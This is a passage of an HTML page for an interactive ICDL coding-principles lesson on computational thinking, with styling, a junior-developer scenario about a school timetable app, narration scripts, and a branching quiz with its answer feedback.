CARD ── */\n  .scenario-card {\n    background: linear-gradient(135deg, rgba(26,92,246,0.15), rgba(0,212,255,0.08));\n    border: 1px solid rgba(0,212,255,0.25);\n    border-radius: 16px; padding: 32px 36px; margin-bottom: 20px;\n    position: relative;\n  }\n  .scenario-card::before {\n    content: ''🔍'';\n    position: absolute; top: -16px; left: 28px;\n    font-size: 28px; line-height: 1;\n  }\n  .scenario-label {\n    font-family: ''DM Mono'', monospace; font-size: 10px; letter-spacing: 2px; text-transform: uppercase;\n    color: var(--cyan); margin-bottom: 12px; display: block;\n  }\n  .scenario-card h3 {\n    font-family: ''Syne'', sans-serif; font-size: 18px; font-weight: 700; margin-bottom: 10px;\n  }\n  .scenario-card p { color: rgba(245,247,255,0.75); line-height: 1.75; font-size: 14px; }\n\n  /* ── CONCEPT GRID ── */\n  .concept-grid {\n    display: grid; grid-template-columns: repeat(2, 1fr); gap: 16px; margin-bottom: 20px;\n  }\n  @media(max-width:600px) { .concept-grid { grid-template-columns: 1fr; } }\n  .concept-tile {\n    background: var(--card); border: 1px solid var(--glass-border);\n    border-radius: 14px; padding: 24px 22px;\n    transition: border-color 0.25s, transform 0.25s;\n    cursor: default;\n  }\n  .concept-tile:hover { border-color: rgba(0,212,255,0.3); transform: translateY(-3px); }\n  .concept-icon { font-size: 28px; margin-bottom: 12px; line-height: 1; }\n  .concept-tile h4 {\n    font-family: ''Syne'', sans-serif; font-size: 15px; font-weight: 700;\n    color: var(--cyan); margin-bottom: 8px;\n  }\n  .concept-tile p { font-size: 13px; color: var(--muted); line-height: 1.65; }\n\n  /* ── HIGHLIGHT BOX ── */\n  .highlight-box {\n    border-left: 3px solid var(--lime);\n    padding: 18px 24px;\n    background: rgba(182,255,78,0.05);\n    border-radius: 0 10px 10px 0;\n    margin: 20px 0;\n    font-size: 14px; color: rgba(245,247,255,0.8); line-height: 1.7;\n  }\n  .highlight-box strong { color: var(--lime); }\n\n  /* ── CODE BLOCK ── */\n  .pseudo-block {\n    background: rgba(0,0,0,0.4); border: 1px solid rgba(26,92,246,0.3);\n    border-radius: 12px; padding: 22px 26px; margin: 16px 0;\n    font-family: ''DM Mono'', monospace; font-size: 13px; line-height: 1.9;\n    color: rgba(245,247,255,0.8);\n  }\n  .pseudo-block .kw { color: var(--cyan); }\n  .pseudo-block .cm { color: var(--muted); font-style: italic; }\n  .pseudo-block .val { color: var(--lime); }\n\n  /* ── STEPS LIST ── */\n  .steps { list-style: none; margin: 16px 0; }\n  .steps li {\n    display: flex; gap: 16px; align-items: flex-start;\n    padding: 14px 0; border-bottom: 1px solid var(--glass-border);\n    font-size: 14px; color: rgba(245,247,255,0.75); line-height: 1.65;\n  }\n  .steps li:last-child { border-bottom: none; }\n  .step-num {\n    flex-shrink: 0; width: 28px; height: 28px; border-radius: 50%;\n    background: rgba(26,92,246,0.3); border: 1px solid rgba(26,92,246,0.5);\n    display: flex; align-items: center; justify-content: center;\n    font-family: ''DM Mono'', monospace; font-size: 11px; color: var(--cyan);\n    margin-top: 1px;\n  }\n\n  /* ── NEXT BUTTON ── */\n  .btn-next {\n    display: inline-flex; align-items: center; gap: 10px;\n    background: linear-gradient(135deg, var(--blue), #0e4fdb);\n    color: white; font-family: ''Syne'', sans-serif; font-size: 14px; font-weight: 700;\n    padding: 14px 32px; border-radius: 10px; border: none; cursor: pointer;\n    transition: transform 0.2s, box-shadow 0.2s; margin-top: 8px;\n    letter-spacing: 0.5px;\n  }\n  .btn-next:hover { transform: translateY(-2px); box-shadow: 0 8px 28px rgba(26,92,246,0.45); }\n  .btn-next .arr { font-size: 18px; }\n\n  /* ── QUIZ ── */\n  .quiz-header { margin-bottom: 30px; }\n  .quiz-header .q-num {\n    font-family: ''DM Mono'', monospace; font-size: 11px; letter-spacing: 2px; text-transform: uppercase;\n    color: var(--cyan); margin-bottom: 10px;\n  }\n  .quiz-question {\n    font-family: ''Syne'', sans-serif; font-size: 22px; font-weight: 700; line-height: 1.35;\n  }\n  .quiz-scenario {\n    background: rgba(26,92,246,0.12); border: 1px solid rgba(26,92,246,0.25);\n    border-radius: 10px; padding: 18px 22px; margin: 16px 0 24px;\n    font-size: 14px; color: rgba(245,247,255,0.7); line-height: 1.7;\n    font-style: italic;\n  }\n\n  .options { display: flex; flex-direction: column; gap: 12px; margin-top: 8px; }\n  .option-btn {\n    background: var(--card); border: 1px solid var(--glass-border);\n    border-radius: 12px; padding: 18px 24px;\n    display: flex; align-items: flex-start; gap: 16px;\n    cursor: pointer; transition: all 0.22s; text-align: left;\n    font-size: 14px; color: rgba(245,247,255,0.8); line-height: 1.55;\n  }\n  .option-btn:hover { border-color: var(--blue); background: rgba(26,92,246,0.15); }\n  .option-btn.selected { border-color: var(--blue); background: rgba(26,92,246,0.2); }\n  .option-btn.correct { border-color: var(--correct)!important; background: rgba(46,204,113,0.15)!important; color: white; }\n  .option-btn.wrong   { border-color: var(--wrong)!important;   background: rgba(231,76,60,0.12)!important; opacity: 0.7; }\n  .option-letter {\n    flex-shrink: 0; width: 30px; height: 30px; border-radius: 8px;\n    background: rgba(255,255,255,0.06); border: 1px solid var(--glass-border);\n    display: flex; align-items: center; justify-content: center;\n    font-family: ''DM Mono'', monospace; font-size: 12px; color: var(--muted);\n    transition: all 0.2s;\n  }\n  .option-btn.selected .option-letter { background: var(--blue); border-color: var(--blue); color: white; }\n  .option-btn.correct .option-letter  { background: var(--correct); border-color: var(--correct); color: white; }\n  .option-btn.wrong   .option-letter  { background: var(--wrong); border-color: var(--wrong); color: white; }\n\n  /* ── FEEDBACK ── */\n  .feedback-box {\n    border-radius: 12px; padding: 20px 24px; margin-top: 20px;\n    display: none; animation: fadeUp 0.35s ease both;\n    font-size: 14px; line-height: 1.7;\n  }\n  .feedback-box.correct { background: rgba(46,204,113,0.12); border: 1px solid rgba(46,204,113,0.3); }\n  .feedback-box.wrong   { background: rgba(231,76,60,0.10);  border: 1px solid rgba(231,76,60,0.25); }\n  .feedback-box .fb-title {\n    font-family: ''Syne'', sans-serif; font-weight: 700; font-size: 15px; margin-bottom: 6px;\n  }\n  .feedback-box.correct .fb-title { color: var(--correct); }\n  .feedback-box.wrong   .fb-title { color: var(--wrong); }\n  .feedback-box p { color: rgba(245,247,255,0.75); }\n\n  /* ── BRANCH CHOICE ── */\n  .branch-wrap { margin-top: 24px; display: none; flex-direction: column; gap: 12px; }\n  .branch-wrap.show { display: flex; }\n  .branch-btn {\n    background: var(--glass); border: 1px solid var(--glass-border);\n    border-radius: 12px; padding: 16px 22px;\n    display: flex; align-items: center; gap: 14px;\n    cursor: pointer; transition: all 0.22s;\n    font-size: 14px; font-family: ''DM Sans'', sans-serif; color: var(--white);\n    text-align: left;\n  }\n  .branch-btn:hover { border-color: var(--cyan); background: rgba(0,212,255,0.08); }\n  .branch-icon { font-size: 22px; flex-shrink: 0; }\n\n  /* ── RESULTS ── */\n  .results-hero {\n    text-align: center; padding: 52px 20px 40px;\n  }\n  .score-ring {\n    width: 120px; height: 120px; border-radius: 50%;\n    background: conic-gradient(var(--cyan) var(--pct, 0%), var(--glass-border) 0%);\n    display: flex; align-items: center; justify-content: center;\n    margin: 0 auto 24px;\n    position: relative;\n  }\n  .score-ring::before {\n    content: '''';\n    position: absolute; inset: 8px; border-radius: 50%;\n    background: var(--navy);\n  }\n  .score-inner {\n    position: relative; z-index: 1; text-align: center;\n  }\n  .score-num {\n    font-family: ''Syne'', sans-serif; font-size: 30px; font-weight: 800; color: var(--cyan);\n    line-height: 1;\n  }\n  .score-label { font-size: 10px; color: var(--muted); font-family: ''DM Mono'', monospace; letter-spacing: 1px; }\n  .results-title {\n    font-family: ''Syne'', sans-serif; font-size: 28px; font-weight: 800; margin-bottom: 12px;\n  }\n  .results-desc { color: var(--muted); font-size: 14px; max-width: 440px; margin: 0 auto 32px; line-height: 1.7; }\n  .results-detail {\n    display: grid; grid-template-columns: repeat(3,1fr); gap: 16px;\n    margin-bottom: 36px;\n  }\n  .result-stat {\n    background: var(--card); border: 1px solid var(--glass-border); border-radius: 14px; padding: 22px 16px; text-align: center;\n  }\n  .result-stat .rs-val { font-family: ''Syne'', sans-serif; font-size: 28px; font-weight: 800; margin-bottom: 4px; }\n  .result-stat .rs-key { font-size: 11px; font-family: ''DM Mono'', monospace; color: var(--muted); letter-spacing: 1px; text-transform: uppercase; }\n  .btn-restart {\n    background: transparent; border: 1px solid var(--glass-border);\n    color: var(--muted); font-family: ''Syne'', sans-serif; font-size: 14px;\n    padding: 12px 28px; border-radius: 10px; cursor: pointer;\n    transition: all 0.2s; margin-left: 12px;\n  }\n  .btn-restart:hover { border-color: var(--white); color: var(--white); }\n\n  /* ── TOOLTIP GLOSSARY ── */\n  .tip {\n    border-bottom: 1px dashed var(--cyan); color: var(--cyan); cursor: help;\n    position: relative; display: inline;\n  }\n  .tip:hover::after {\n    content: attr(data-tip);\n    position: absolute; bottom: calc(100% + 8px); left: 50%; transform: translateX(-50%);\n    background: var(--navy2); border: 1px solid rgba(0,212,255,0.3); border-radius: 8px;\n    padding: 8px 14px; font-size: 12px; color: var(--white); line-height: 1.5;\n    white-space: nowrap; max-width: 240px; white-space: normal;\n    z-index: 100; pointer-events: none;\n  }\n</style>\n</head>\n<body>\n<div id="app">\n  <header>\n    <div class="logo-tag">ICDL <span>/</span> Coding Principles <span>/</span> Syllabus 1.0</div>\n    <div class="module-badge">&lt;/&gt; MODULE 1–2</div>\n  </header>\n\n  <div class="progress-wrap">\n    <div class="progress-label">\n      <span id="progress-text">Chapter 1 of 3</span>\n      <span id="progress-pct">0%</span>\n    </div>\n    <div class="progress-track"><div class="progress-fill" id="progress-fill" style="width:0%"></div></div>\n  </div>\n\n  <!-- ═══════════════════════════════════════════════ SCREEN 0: INTRO -->\n  <div class="screen active" id="screen-0">\n    <div class="chapter-hero" data-num="0">\n      <div class="chapter-eyebrow">Welcome · Interactive Lesson</div>\n      <h1 class="chapter-title">Computational<br><em>Thinking</em> Methods</h1>\n      <p class="chapter-desc">\n        Explore the core concepts behind how computers—and developers—think. \n        This lesson covers <strong>Key Concepts (1.1)</strong> and <strong>Problem Analysis (2.1)</strong> \n        from the ICDL Coding Principles Syllabus, with real-world scenarios and branching quizzes.\n      </p>\n      <br>\n      <button class="btn-next" onclick="goTo(1)">Start Learning <span class="arr">→</span></button>\n    </div>\n  </div>\n\n  <!-- ═══════════════════════════════════════════════ SCREEN 1: 1.1 Key Concepts -->\n  <div class="screen" id="screen-1">\n    <div class="chapter-hero" data-num="1">\n      <div class="chapter-eyebrow">Skill Set 1.1</div>\n      <h2 class="chapter-title">Key <em>Concepts</em></h2>\n      <p class="chapter-desc">Before writing a single line of code, every developer must understand the fundamental language of computing.</p>\n    </div>\n\n    <!-- Narration -->\n    <div class="narration-bar" id="narr-1">\n      <button class="narr-btn" id="narr-btn-1" onclick="toggleNarration(1)">\n        <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>\n      </button>\n      <div class="narr-text">\n        <strong>🔊 Voice Narration</strong>\n        Click play to hear this chapter narrated aloud using your device''s voice synthesis.\n      </div>\n      <div class="narr-waves" id="narr-waves-1">\n        <span></span><span></span><span></span><span></span><span></span>\n      </div>\n    </div>\n\n    <div class="scenario-card">\n      <span class="scenario-label">📋 Real-World Scenario</span>\n      <h3>Meet Amara — Junior Developer</h3>\n      <p>Amara just joined a software team. On day one, her manager asks her to review a <em>program specification</em> and understand the difference between <em>source code</em> and <em>machine code</em>. She realises she needs to nail the fundamentals before anything else.</p>\n    </div>\n\n    <div class="concept-grid">\n      <div class="concept-tile">\n        <div class="concept-icon">💻</div>\n        <h4>Computing</h4>\n        <p>The use of computers and algorithms to process information, solve problems, and automate tasks.</p>\n      </div>\n      <div class="concept-tile">\n        <div class="concept-icon">🧠</div>\n        <h4>Computational Thinking</h4>\n        <p>A problem-solving approach that formulates problems and solutions in a way a computer can execute.</p>\n      </div>\n      <div class="concept-tile">\n        <div class="concept-icon">📜</div>\n        <h4>Program</h4>\n        <p>A set of instructions written in a programming language that a computer executes to perform a task.</p>\n      </div>\n      <div class="concept-tile">\n        <div class="concept-icon">⚙️</div>\n        <h4>Code</h4>\n        <p>Instructions written in a programming language. <strong>Source code</strong> is human-readable; <strong>machine code</strong> is binary for the CPU.</p>\n      </div>\n    </div>\n\n    <div class="content-card">\n      <span class="card-tag">Ref: 1.1.5 – 1.1.6</span>\n      <h3>Specification &amp; Program Lifecycle</h3>\n      <p>A <span class="tip" data-tip="A detailed description of what a program should do, including inputs, outputs, and constraints.">program specification</span> defines what software must do before any code is written. The typical creation activities are:</p>\n      <ul class="steps">\n        <li><span class="step-num">1</span> <strong>Analysis</strong> — Understand the problem and gather requirements.</li>\n        <li><span class="step-num">2</span> <strong>Design</strong> — Plan the solution using algorithms and flowcharts.</li>\n        <li><span class="step-num">3</span> <strong>Programming</strong> — Write the actual source code.</li>\n        <li><span class="step-num">4</span> <strong>Testing</strong> — Run the program and find errors (bugs).</li>\n        <li><span class="step-num">5</span> <strong>Enhancement</strong> — Improve and extend the program over time.</li>\n      </ul>\n    </div>\n\n    <div class="content-card">\n      <span class="card-tag">Ref: 1.1.7</span>\n      <h3>Formal vs Natural Language</h3>\n      <p>A <strong>natural language</strong> (like English or Swahili) is flexible and context-dependent — full of ambiguity. A <strong>formal language</strong> (like Python or JavaScript) is strict, precise, and unambiguous. Computers require formal languages because they cannot interpret context or intent.</p>\n      <div class="highlight-box">\n        <strong>Key insight:</strong> "Add the numbers" is natural language. <code>sum = a + b</code> is formal language. The computer understands only the latter.\n      </div>\n    </div>\n\n    <button class="btn-next" onclick="goTo(2)">Next: Problem Analysis <span class="arr">→</span></button>\n  </div>\n\n  <!-- ═══════════════════════════════════════════════ SCREEN 2: 2.1 Problem Analysis -->\n  <div class="screen" id="screen-2">\n    <div class="chapter-hero" data-num="2">\n      <div class="chapter-eyebrow">Skill Set 2.1</div>\n      <h2 class="chapter-title">Problem <em>Analysis</em></h2>\n      <p class="chapter-desc">Computational thinking is not just about coding — it''s a structured way of analysing and solving any complex problem.</p>\n    </div>\n\n    <div class="narration-bar" id="narr-2">\n      <button class="narr-btn" id="narr-btn-2" onclick="toggleNarration(2)">\n        <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>\n      </button>\n      <div class="narr-text">\n        <strong>🔊 Voice Narration</strong>\n        Click play to hear this chapter narrated aloud.\n      </div>\n      <div class="narr-waves" id="narr-waves-2">\n        <span></span><span></span><span></span><span></span><span></span>\n      </div>\n    </div>\n\n    <div class="scenario-card">\n      <span class="scenario-label">📋 Real-World Scenario</span>\n      <h3>Amara''s First Task: Build a School Timetable App</h3>\n      <p>Amara''s team needs to build a timetable system for a school. The project seems huge — hundreds of classes, teachers, rooms, and constraints. Her senior developer tells her: <em>"Apply computational thinking. Break it down before you build it up."</em></p>\n    </div>\n\n    <div class="content-card">\n      <span class="card-tag">Ref: 2.1.1</span>\n      <h3>The Four Methods</h3>\n      <div class="concept-grid" style="margin-top:16px">\n        <div class="concept-tile">\n          <div class="concept-icon">🧩</div>\n          <h4>Decomposition</h4>\n          <p>Break a complex problem into smaller, manageable sub-problems. Solve each separately.</p>\n        </div>\n        <div class="concept-tile">\n          <div class="concept-icon">🔁</div>\n          <h4>Pattern Recognition</h4>\n          <p>Identify similarities or trends among sub-problems to reuse solutions efficiently.</p>\n        </div>\n        <div class="concept-tile">\n          <div class="concept-icon">🎭</div>\n          <h4>Abstraction</h4>\n          <p>Focus on essential details; filter out everything that doesn''t matter for the solution.</p>\n        </div>\n        <div class="concept-tile">\n          <div class="concept-icon">📋</div>\n          <h4>Algorithms</h4>\n          <p>Step-by-step instructions to solve a specific problem, designed to be executed by a computer.</p>\n        </div>\n      </div>\n    </div>\n\n    <div class="content-card">\n      <span class="card-tag">Ref: 2.1.2 – 2.1.3 — Decomposition &amp; Patterns</span>\n      <h3>Amara Applies Decomposition</h3>\n      <p>She breaks the timetable problem into smaller parts:</p>\n      <ul class="steps">\n        <li><span class="step-num">A</span>Manage a list of teachers and their subjects</li>\n        <li><span class="step-num">B</span>Manage a list of rooms and their capacities</li>\n        <li><span class="step-num">C</span>Manage class schedules and time slots</li>\n        <li><span class="step-num">D</span>Detect and resolve conflicts (double-booking)</li>\n      </ul>\n      <div class="highlight-box">\n        <strong>Pattern recognised:</strong> Sub-problems A and B are essentially the same — "manage a list of items with attributes." She can build one reusable component for both.\n      </div>\n    </div>\n\n    <div class="content-card">\n      <span class="card-tag">Ref: 2.1.4 — Abstraction</span>\n      <h3>Filtering the Unnecessary</h3>\n      <p>Amara realises the app doesn''t need to know a teacher''s home address, favourite colour, or shoe size — only their name, subjects taught, and availability. <span class="tip" data-tip="Abstraction means representing only the details relevant to solving the current problem, ignoring everything else.">Abstraction</span> helps her design a clean, focused data model.</p>\n      <div class="pseudo-block">\n        <span class="cm">// Abstract model — only what matters</span><br>\n        <span class="kw">Teacher</span> {<br>\n        &nbsp;&nbsp;name: <span class="val">"string"</span>,<br>\n        &nbsp;&nbsp;subjects: <span class="val">["list"]</span>,<br>\n        &nbsp;&nbsp;availability: <span class="val">[[timeslots]]</span><br>\n        }\n      </div>\n    </div>\n\n    <div class="content-card">\n      <span class="card-tag">Ref: 2.1.5 — Algorithms</span>\n      <h3>Algorithms in Computational Thinking</h3>\n      <p>An <span class="tip" data-tip="A finite, ordered set of well-defined instructions that takes some value as input and produces some value as output.">algorithm</span> is the bridge between problem-solving thinking and actual code. Once you''ve decomposed your problem, recognised patterns, and abstracted unnecessary details, you express the solution as an algorithm — before writing any actual code.</p>\n      <div class="pseudo-block">\n        <span class="cm">// Pseudocode: Detect a scheduling conflict</span><br>\n        <span class="kw">FOR EACH</span> new_class <span class="kw">IN</span> schedule:<br>\n        &nbsp;&nbsp;<span class="kw">IF</span> teacher.availability[new_class.time] == <span class="val">BUSY</span>:<br>\n        &nbsp;&nbsp;&nbsp;&nbsp;SHOW conflict_warning<br>\n        &nbsp;&nbsp;<span class="kw">ELSE</span>:<br>\n        &nbsp;&nbsp;&nbsp;&nbsp;ADD new_class <span class="kw">TO</span> schedule\n      </div>\n    </div>\n\n    <button class="btn-next" onclick="goTo(3)">Take the Quiz <span class="arr">→</span></button>\n  </div>\n\n  <!-- ═══════════════════════════════════════════════ SCREEN 3: QUIZ Q1 -->\n  <div class="screen" id="screen-3">\n    <div class="chapter-hero" data-num="Q">\n      <div class="chapter-eyebrow">Branching Quiz · Question 1 of 5</div>\n      <h2 class="chapter-title">Test Your <em>Knowledge</em></h2>\n      <p class="chapter-desc">Based on what Amara encountered — and what you''ve just learned. Your path may branch depending on your answers!</p>\n    </div>\n\n    <div class="content-card">\n      <div class="quiz-header">\n        <div class="q-num">Question 1 / 5 — Ref. 1.1.4</div>\n        <div class="quiz-question">What is the difference between source code and machine code?</div>\n      </div>\n      <div class="options" id="opts-q1">\n        <button class="option-btn" onclick="answerQ(1,''A'')"><span class="option-letter">A</span>Source code is binary; machine code is human-readable text.</button>\n        <button class="option-btn" onclick="answerQ(1,''B'')"><span class="option-letter">B</span>Source code is written by humans in a programming language; machine code is binary instructions for the CPU.</button>\n        <button class="option-btn" onclick="answerQ(1,''C'')"><span class="option-letter">C</span>They are the same thing — two names for identical concepts.</button>\n        <button class="option-btn" onclick="answerQ(1,''D'')"><span class="option-letter">D</span>Source code runs directly on hardware; machine code requires an interpreter.</button>\n      </div>\n      <div class="feedback-box" id="fb-q1"></div>\n      <div class="branch-wrap" id="branch-q1"></div>\n    </div>\n  </div>\n\n  <!-- ═══════════════════════════════════════════════ SCREEN 4: QUIZ Q2 -->\n  <div class="screen" id="screen-4">\n    <div class="content-card">\n      <div class="quiz-header">\n        <div class="q-num">Question 2 / 5 — Ref. 1.1.6</div>\n        <div class="quiz-question">Amara''s team finishes coding. What is the <em>next</em> typical step in the program creation lifecycle?</div>\n        <div class="quiz-scenario">The team has written all the features for the school timetable app. They hand it to Amara saying "it''s done — ship it!" Amara hesitates…</div>\n      </div>\n      <div class="options" id="opts-q2">\n        <button class="option-btn" onclick="answerQ(2,''A'')"><span class="option-letter">A</span>Enhancement — immediately add more features.</button>\n        <button class="option-btn" onclick="answerQ(2,''B'')"><span class="option-letter">B</span>Testing — run the program and identify errors before release.</button>\n        <button class="option-btn" onclick="answerQ(2,''C'')"><span class="option-letter">C</span>Analysis — re-gather requirements after coding.</button>\n        <button class="option-btn" onclick="answerQ(2,''D'')"><span class="option-letter">D</span>Design — draw flowcharts after writing the code.</button>\n      </div>\n      <div class="feedback-box" id="fb-q2"></div>\n      <div class="branch-wrap" id="branch-q2"></div>\n    </div>\n  </div>\n\n  <!-- ═══════════════════════════════════════════════ SCREEN 5: QUIZ Q3 -->\n  <div class="screen" id="screen-5">\n    <div class="content-card">\n      <div class="quiz-header">\n        <div class="q-num">Question 3 / 5 — Ref. 2.1.2</div>\n        <div class="quiz-question">Which computational thinking method did Amara use when she split the timetable project into: teachers, rooms, schedules, and conflicts?</div>\n        <div class="quiz-scenario">Amara''s senior said: "Break it down before you build it up." She created four distinct sub-tasks from one large problem.</div>\n      </div>\n      <div class="options" id="opts-q3">\n        <button class="option-btn" onclick="answerQ(3,''A'')"><span class="option-letter">A</span>Abstraction</button>\n        <button class="option-btn" onclick="answerQ(3,''B'')"><span class="option-letter">B</span>Pattern Recognition</button>\n        <button class="option-btn" onclick="answerQ(3,''C'')"><span class="option-letter">C</span>Decomposition</button>\n        <button class="option-btn" onclick="answerQ(3,''D'')"><span class="option-letter">D</span>Algorithm Design</button>\n      </div>\n      <div class="feedback-box" id="fb-q3"></div>\n      <div class="branch-wrap" id="branch-q3"></div>\n    </div>\n  </div>\n\n  <!-- ═══════════════════════════════════════════════ SCREEN 6: QUIZ Q4 -->\n  <div class="screen" id="screen-6">\n    <div class="content-card">\n      <div class="quiz-header">\n        <div class="q-num">Question 4 / 5 — Ref. 2.1.4</div>\n        <div class="quiz-question">Amara needs to model a "Teacher" in her app. Which details should she <em>exclude</em> based on the principle of abstraction?</div>\n        <div class="quiz-scenario">She must choose which data points to store for each teacher object in the system.</div>\n      </div>\n      <div class="options" id="opts-q4">\n        <button class="option-btn" onclick="answerQ(4,''A'')"><span class="option-letter">A</span>Name, subjects taught, and availability</button>\n        <button class="option-btn" onclick="answerQ(4,''B'')"><span class="option-letter">B</span>Home address, favourite colour, and shoe size</button>\n        <button class="option-btn" onclick="answerQ(4,''C'')"><span class="option-letter">C</span>Employee ID and department</button>\n        <button class="option-btn" onclick="answerQ(4,''D'')"><span class="option-letter">D</span>Weekly timetable slots</button>\n      </div>\n      <div class="feedback-box" id="fb-q4"></div>\n      <div class="branch-wrap" id="branch-q4"></div>\n    </div>\n  </div>\n\n  <!-- ═══════════════════════════════════════════════ SCREEN 7: QUIZ Q5 -->\n  <div class="screen" id="screen-7">\n    <div class="content-card">\n      <div class="quiz-header">\n        <div class="q-num">Question 5 / 5 — Ref. 1.1.7 + 2.1.3</div>\n        <div class="quiz-question">Amara notices that managing "teachers" and managing "rooms" follow an identical structure. What computational thinking technique is she applying?</div>\n        <div class="quiz-scenario">Both involve: a unique ID, a name, a set of attributes, and availability slots. She writes one general solution for both.</div>\n      </div>\n      <div class="options" id="opts-q5">\n        <button class="option-btn" onclick="answerQ(5,''A'')"><span class="option-letter">A</span>Decomposition</button>\n        <button class="option-btn" onclick="answerQ(5,''B'')"><span class="option-letter">B</span>Pattern Recognition</button>\n        <button class="option-btn" onclick="answerQ(5,''C'')"><span class="option-letter">C</span>Abstraction</button>\n        <button class="option-btn" onclick="answerQ(5,''D'')"><span class="option-letter">D</span>Algorithm sequencing</button>\n      </div>\n      <div class="feedback-box" id="fb-q5"></div>\n      <div class="branch-wrap" id="branch-q5"></div>\n    </div>\n  </div>\n\n  <!-- ═══════════════════════════════════════════════ SCREEN 8: RESULTS -->\n  <div class="screen" id="screen-8">\n    <div class="chapter-hero" data-num="✓">\n      <div class="chapter-eyebrow">Lesson Complete</div>\n      <h2 class="chapter-title">Your <em>Results</em></h2>\n    </div>\n    <div class="content-card">\n      <div class="results-hero">\n        <div class="score-ring" id="score-ring">\n          <div class="score-inner">\n            <div class="score-num" id="score-num">0/5</div>\n            <div class="score-label">SCORE</div>\n          </div>\n        </div>\n        <h3 class="results-title" id="results-title">Well done!</h3>\n        <p class="results-desc" id="results-desc">You''ve completed the Computational Thinking Methods lesson.</p>\n      </div>\n      <div class="results-detail">\n        <div class="result-stat">\n          <div class="rs-val" id="rs-correct" style="color:var(--correct)">0</div>\n          <div class="rs-key">Correct</div>\n        </div>\n        <div class="result-stat">\n          <div class="rs-val" id="rs-wrong" style="color:var(--wrong)">0</div>\n          <div class="rs-key">Incorrect</div>\n        </div>\n        <div class="result-stat">\n          <div class="rs-val" id="rs-pct" style="color:var(--cyan)">0%</div>\n          <div class="rs-key">Accuracy</div>\n        </div>\n      </div>\n      <div style="text-align:center">\n        <button class="btn-next" onclick="goTo(1)">Restart Lesson <span class="arr">↺</span></button>\n        <button class="btn-restart" onclick="goTo(3)">Retake Quiz</button>\n      </div>\n    </div>\n  </div>\n\n</div><!-- /app -->\n\n<script>\n// ── STATE ──────────────────────────────────────────────────────────────\nlet currentScreen = 0;\nlet score = 0;\nlet wrongCount = 0;\nlet answered = {};\nlet speechSynth = window.speechSynthesis;\nlet currentUtterance = null;\nlet playingChapter = null;\n\nconst TOTAL_SCREENS = 9; // 0–8\n\n// ── NARRATION SCRIPTS ──────────────────────────────────────────────────\nconst narration = {\n  1: `Chapter 1: Key Concepts. Before writing any code, developers must understand the language of computing. Computing is the use of computers to process information and solve problems. Computational thinking is a problem-solving approach that structures solutions in a way a computer can execute. A program is a set of instructions written in a formal programming language. Code can be source code, which is human-readable, or machine code, which is binary — directly understood by your processor. A program specification describes what a program should do before development begins. The typical creation lifecycle has five stages: Analysis, Design, Programming, Testing, and Enhancement. Finally, unlike natural languages like English, formal languages like Python are precise and unambiguous — computers need this clarity.`,\n  2: `Chapter 2: Problem Analysis. Computational thinking uses four key methods to analyse and solve complex problems. First: Decomposition — break a large problem into smaller, manageable parts. Second: Pattern Recognition — identify similarities among those smaller parts to reuse solutions. Third: Abstraction — filter out irrelevant details and focus only on what matters for your solution. Fourth: Algorithms — express your solution as step-by-step instructions that a computer can follow. Consider Amara''s timetable project. She decomposes it into four sub-problems: teachers, rooms, schedules, and conflicts. She then recognises that managing teachers and managing rooms follow the same pattern. Through abstraction, she keeps only relevant data. And finally, she expresses the conflict-detection logic as an algorithm using pseudocode — ready to be turned into real code.`\n};\n\n// ── QUIZ DATA ──────────────────────────────────────────────────────────\nconst quizData = {\n  1: {\n    correct: ''B'',\n    feedback: {\n      B: { ok: true,  title: ''✅ Correct!'', text: ''Source code is human-readable instructions written in a programming language (like Python). Machine code is binary (0s and 1s) that the CPU executes directly. A compiler or interpreter converts between them.'' },\n      _: { ok: false, title: ''❌ Not quite.'', text: ''Source code is written by humans in a programming language (human-readable). Machine code is binary (0s and 1s) that runs directly on hardware. They are very different stages of the same program.'' }\n    },\n    branch: {\n      B:  [{ icon:''🚀'', label:''Continue to Q2'', action:() => goTo(4) }],\n      _:  [{ icon:''🔁'', label:''Review Key Concepts, then continue'', action:() => goTo(4) }, { icon:''📖'', label:''Go back and re-read 1.1.4'', action:() => { goTo(1); setTimeout(()=>window.scrollTo({top:0,behavior:''smooth''}),100); } }]\n    }\n  },\n  2: {\n    correct: ''B'',\n    feedback: {\n      B: { ok: true,  title: ''✅ Correct!'', text: ''Testing comes after Programming in the standard lifecycle. Amara was right to pause! You must test for errors (syntax and logic bugs) before releasing software to users.'' },\n      _: { ok: false, title: ''❌ Not quite.'', text: ''The correct order is: Analysis → Design → Programming → Testing → Enhancement. Testing always comes after programming — you must verify the code works before enhancement or release.'' }\n    },\n    branch: {\n      B:  [{ icon:''🚀'', label:''Great! On to Q3'', action:() => goTo(5) }],\n      _:  [{ icon:''📖'', label:''Review lifecycle (1.1.6), then continue'', action:() => goTo(5) }]\n    }\n  },\n  3: {\n    correct: ''C'',\n    feedback: {\n      C: { ok: true,  title: ''✅ Correct!'', text: ''Decomposition is exactly this: breaking one complex problem into smaller, manageable sub-problems. Each part can be tackled independently.'' },\n      A: { ok: false, title: ''❌ Not quite — that\\''s Abstraction.'', text: ''Abstraction is about filtering out irrelevant details. Decomposition is about breaking a problem into smaller parts.'' },\n      B: { ok: false, title: ''❌ Close — but that\\''s Pattern Recognition.'', text: ''Pattern recognition identifies similarities across sub-problems. Decomposition is the act of splitting a big problem into smaller ones first.'' },\n      _: { ok: false, title: ''❌ Not quite.'', text: ''Decomposition means breaking a complex problem into smaller, manageable parts. This is exactly what Amara did when she split the timetable project.'' }\n    },\n    branch: {\n      C:  [{ icon:''🚀'', label:''Excellent! Continue to Q4'', action:() => goTo(6) }],\n      _:  [{ icon:''📖'', label:''Re-read Problem Analysis (2.1.2), then Q4'', action:() => goTo(6) }]\n    }\n  },\n  4: {\n    correct: ''B'',\n    feedback: {\n      B: { ok: true,  title: ''✅ Correct!'', text: ''Abstraction means keeping only what\\''s relevant. Home address, favourite colour, and shoe size have nothing to do with timetable scheduling — they should be left out of the model.'' },\n      _: { ok: false, title: ''❌ Not quite.'', text: ''Abstraction filters out unnecessary details. For a timetable app, personal details like home address, favourite colour, and shoe size are irrelevant — and should be excluded from the data model.'' }\n    },\n    branch: {\n      B:  [{ icon:''🚀'', label:''Perfect! Final Question'', action:() => goTo(7) }],\n      _:  [{ icon:''📖'', label:''Re-read Abstraction (2.1.4), then continue'', action:() => goTo(7) }]\n    }\n  },\n  5: {\n    correct: ''B'',\n    feedback: {\n      B: { ok: true,  title: ''✅ Correct!'', text: ''Pattern recognition! Amara noticed that "teachers" and "rooms" share identical structures. By recognising this 